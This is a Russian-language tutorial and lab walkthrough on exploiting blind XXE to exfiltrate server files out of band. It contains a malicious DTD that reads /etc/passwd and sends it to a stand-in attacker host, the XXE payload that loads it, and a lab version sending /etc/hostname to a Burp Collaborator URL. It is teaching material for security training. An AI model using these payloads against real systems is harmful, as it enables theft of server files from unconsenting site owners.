Использование слепого XXE для извлечения данных за пределы канала
Обнаружение слепой уязвимости XXE с помощью внеполосных методов — это очень хорошо, но это на самом деле не демонстрирует, как уязвимость может быть использована. На самом деле злоумышленник хочет получить доступ к конфиденциальным данным. Этого можно добиться с помощью слепой уязвимости XXE, но это подразумевает, что злоумышленник размещает вредоносный DTD в системе, которую он контролирует, а затем вызывает внешний DTD из внутриполосной полезной нагрузки XXE.

Пример вредоносного DTD для извлечения содержимого /etc/passwdфайла выглядит следующим образом:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
Данный DTD выполняет следующие шаги:

Определяет параметрическую сущность XML с именем file, содержащую содержимое файла /etc/passwd.
Определяет параметр XML-сущности, называемый eval, содержащий динамическое объявление другой параметр XML-сущности, называемой exfiltrate. exfiltrateСущность будет оценена путем выполнения HTTP-запроса к веб-серверу злоумышленника, содержащего значение сущности fileв строке запроса URL.
Использует сущность, что приводит к выполнению evalдинамического объявления сущности .exfiltrate
Использует exfiltrateсущность, так что ее значение оценивается путем запроса указанного URL.
Затем злоумышленник должен разместить вредоносный DTD в системе, которую он контролирует, обычно загружая его на свой собственный веб-сервер. Например, злоумышленник может обслуживать вредоносный DTD по следующему URL:

http://web-attacker.com/malicious.dtd
Наконец, злоумышленник должен отправить уязвимому приложению следующую полезную нагрузку XXE:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
Эта полезная нагрузка XXE объявляет сущность параметра XML, которая называется xxe, а затем использует сущность в DTD. Это заставит парсер XML извлечь внешний DTD с сервера злоумышленника и интерпретировать его в строке. Затем выполняются шаги, определенные во вредоносном DTD, и файл /etc/passwdпередается на сервер злоумышленника.

Примечание
Этот метод может не работать с некоторым содержимым файла, включая символы новой строки, содержащиеся в /etc/passwdфайле. Это связано с тем, что некоторые парсеры XML извлекают URL во внешнем определении сущности с помощью API, который проверяет символы, разрешенные для использования в URL. В этой ситуации может быть возможно использовать протокол FTP вместо HTTP. Иногда будет невозможно извлечь данные, содержащие символы новой строки, и поэтому /etc/hostnameвместо этого можно выбрать файл, например .

---

В этой лабораторной работе есть функция «Проверка запасов», которая анализирует входные данные XML, но не отображает результат.

Чтобы решить лабораторную работу, извлеките содержимое файла /etc/hostname.

---

1. Нас встречает список продуктов, переходим на любой из них:

![image](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

2. Внизу страницы есть кнопка "Проверить наличие на складе" включает Burp прокси и нажимаем:

![image](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

3. Поместите полезную нагрузку Burp Collaborator во вредоносный файл DTD:
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://9eoedis3iaw39hfoesyby1y53w9nxnlc.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;

![image](https://github.com/user-attachments/assets/2d285da5-b706-498d-b9d1-b063b2144334)

---

3. Заходим в Proxy -> HTTP History выбираем POST запрос к /product/stock и отправляем в Repeater: 

![image](https://github.com/user-attachments/assets/1ec0f44b-554a-44e4-ad05-c76a4c4857a8)

---

4. Вставьте следующее определение внешней сущности между декларацией XML и stockCheck элементом: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

![image](https://github.com/user-attachments/assets/8d98ee3a-4293-4d50-8625-7b0f8f900f60)

---

5. Перейдите на вкладку Collaborator и нажмите «Poll now». Если вы не видите перечисленных взаимодействий, подождите несколько секунд и попробуйте снова. Вы должны увидеть некоторые взаимодействия DNS и HTTP, которые были инициированы приложением в результате вашей полезной нагрузки.

6. ![image](https://github.com/user-attachments/assets/95a9db28-ab4b-4259-8e06-871d778d7741)
